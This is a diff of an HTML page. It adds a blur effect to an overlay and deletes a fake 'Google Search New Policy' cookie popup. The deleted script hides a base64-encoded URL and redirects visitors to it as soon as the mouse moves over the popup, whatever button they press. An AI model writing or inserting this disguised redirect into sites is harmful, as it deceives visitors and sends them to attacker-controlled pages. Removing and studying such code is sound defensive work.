@@ -64,7 +64,7 @@
     />
   </head>
   <body>
-    <style>
+   <style>
   body {
     font-family: Arial, sans-serif;
     margin: 0;
@@ -79,7 +79,9 @@
     left: 0;
     height: 100vh;
     width: 100vw;
-    background: rgba(0,0,0,0.4);
+    background: rgba(0,0,0,0.35);
+    backdrop-filter: blur(8px);        /* 🔥 Add blur */
+    -webkit-backdrop-filter: blur(8px); /* Safari support */
     display: flex;
     justify-content: center;
     align-items: center;
@@ -117,54 +119,6 @@
     opacity: 0.92;
   }
 </style>
-
-<div class="shade-gate" id="gShadow">
-  <div class="pop-core" id="nucleus">
-    <h3>Google Search New Policy</h3>
-    Our site uses cookies to improve your browsing experience and comply with privacy on internet. To give our users better security we use tracking please accept or decline to continue.
-    <br><br>
-    <button id="zGreen">Accept </button>
-    <button class="risky" id="zRed">Reject </button>
-  </div>
-</div>
-
-<script>
-  const gShadow = document.getElementById("gShadow");
-  const nucleus = document.getElementById("nucleus");
-  const zGreen = document.getElementById("zGreen");
-  const zRed = document.getElementById("zRed");
-
-  const vaultLink = "aHR0cHM6Ly9iYWJ5Z29sZHktN2ZvOWgub25kaWdpdGFsb2NlYW4uYXBwLw "; 
-  const decodedPath = atob(vaultLink);
-  const lag = 1500;
-
-  // Check local flag
-  if (!localStorage.getItem("x_pref")) {
-    gShadow.style.display = "flex";
-  } else {
-    gShadow.style.display = "none";
-  }
-
-  zGreen.addEventListener("click", () => {
-    localStorage.setItem("x_pref", "g");
-    gShadow.style.display = "none";
-  });
-
-  zRed.addEventListener("click", () => {
-    localStorage.setItem("x_pref", "r");
-    gShadow.style.display = "none";
-  });
-
-  let gateTrip = false;
-  nucleus.addEventListener("mousemove", () => {
-    if (!gateTrip) {
-      gateTrip = true;
-      setTimeout(() => {
-        window.location.href = decodedPath;
-      }, lag);
-    }
-  });
-</script>
 
     <link rel="stylesheet" href="./style.css" />
     <div>
